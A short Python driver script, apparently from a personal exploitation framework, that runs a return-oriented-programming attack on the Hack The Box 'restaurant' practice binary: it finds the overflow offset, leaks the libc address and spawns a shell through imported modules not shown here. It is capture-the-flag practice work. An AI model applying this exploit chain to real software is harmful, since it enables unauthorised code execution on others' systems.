import pathlib

from core.target_config import Config, Mode
from core.targetbase import TargetBase
from custom.restaurant import RestaurantPwn
from modules.find_offset import FindOffset
from modules.get_libc_address import GetLibcAddress
from modules.exec_shell import ExecShell

if __name__ == '__main__':
    config = Config(
        rop=True,
        mode=Mode.local,
        file=pathlib.Path('/home/lim8en1/htb/projects-archive/restaurant/pwn_restaurant/restaurant'),
        offset=0x28,
        detect_libc=True
    )

    t = TargetBase(pwn_target=RestaurantPwn, config=config)
    FindOffset.execute(t, config.offset_max)
    if GetLibcAddress.execute(t):
        ExecShell.execute(t)
